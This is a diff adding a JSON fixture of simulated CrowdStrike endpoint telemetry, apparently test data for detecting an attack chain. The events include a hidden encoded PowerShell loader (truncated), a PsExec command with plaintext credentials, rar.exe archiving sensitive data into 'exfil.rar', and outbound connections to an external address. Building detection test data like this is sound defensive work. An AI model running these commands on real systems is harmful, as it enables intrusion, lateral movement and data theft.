@@ -1,0 +1,84 @@
+[
+    {
+        "source_type": "crowdstrike",
+        "raw": {
+            "event_simpleName": "UserLogon",
+            "timestamp": "2026-10-01T08:00:00Z",
+            "UserSid": "S-1-5-21-admin",
+            "ComputerName": "DESKTOP-1",
+            "LogonType": 3,
+            "RemoteAddress": "192.168.1.100"
+        }
+    },
+    {
+        "source_type": "crowdstrike",
+        "raw": {
+            "event_simpleName": "ProcessRollup2",
+            "timestamp": "2026-10-01T08:02:00Z",
+            "UserSid": "S-1-5-21-admin",
+            "ComputerName": "DESKTOP-1",
+            "SHA256HashData": "cmd_hash",
+            "FileName": "cmd.exe",
+            "CommandLine": "cmd.exe /c powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."
+        }
+    },
+    {
+        "source_type": "crowdstrike",
+        "raw": {
+            "event_simpleName": "NetworkConnectIP4",
+            "timestamp": "2026-10-01T08:03:00Z",
+            "ComputerName": "DESKTOP-1",
+            "ContextProcessId": 1234,
+            "LocalAddressIP4": "192.168.1.100",
+            "RemoteAddressIP4": "203.0.113.50",
+            "RemotePort": 443
+        }
+    },
+    {
+        "source_type": "crowdstrike",
+        "raw": {
+            "event_simpleName": "ProcessRollup2",
+            "timestamp": "2026-10-01T08:05:00Z",
+            "UserSid": "S-1-5-21-admin",
+            "ComputerName": "DESKTOP-1",
+            "SHA256HashData": "psexec_hash",
+            "FileName": "psexec.exe",
+            "CommandLine": "psexec.exe \\\\SERVER-1 -u admin -p pass cmd.exe"
+        }
+    },
+    {
+        "source_type": "crowdstrike",
+        "raw": {
+            "event_simpleName": "UserLogon",
+            "timestamp": "2026-10-01T08:05:05Z",
+            "UserSid": "S-1-5-21-admin",
+            "ComputerName": "SERVER-1",
+            "LogonType": 3,
+            "RemoteAddress": "192.168.1.100"
+        }
+    },
+    {
+        "source_type": "crowdstrike",
+        "raw": {
+            "event_simpleName": "ProcessRollup2",
+            "timestamp": "2026-10-01T08:06:00Z",
+            "UserSid": "S-1-5-21-admin",
+            "ComputerName": "SERVER-1",
+            "SHA256HashData": "rar_hash",
+            "FileName": "rar.exe",
+            "CommandLine": "rar.exe a -r C:\\temp\\exfil.rar C:\\sensitive_data\\"
+        }
+    },
+    {
+        "source_type": "crowdstrike",
+        "raw": {
+            "event_simpleName": "NetworkConnectIP4",
+            "timestamp": "2026-10-01T08:10:00Z",
+            "ComputerName": "SERVER-1",
+            "ContextProcessId": 5678,
+            "LocalAddressIP4": "192.168.1.10",
+            "RemoteAddressIP4": "203.0.113.50",
+            "RemotePort": 443
+        }
+    }
+]
